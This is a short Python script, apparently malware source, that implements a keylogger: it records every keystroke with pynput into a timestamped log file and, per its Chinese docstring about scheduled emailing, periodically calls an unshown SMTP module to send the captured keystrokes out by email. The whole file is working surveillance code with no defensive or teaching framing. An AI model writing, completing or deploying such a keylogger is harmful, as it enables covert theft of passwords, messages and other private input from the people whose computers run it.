from pynput.keyboard import Listener
import logging
import schedule
import SMTP
import threading

def key_listen():
	logging.basicConfig(filename = 'keylogger.txt',format="%(asctime)s:%(message)s",level=logging.DEBUG)
	def press(key):
	    logging.info(key)
	with Listener(on_press = press) as listener:
	    listener.join()
def main(time):
    """定时发邮件    监听线程"""
    schedule.every(time).seconds.do(SMTP.main)
    listen = threading.Thread(target=key_listen)
    listen.start()
    while True:
    	schedule.run_pending()
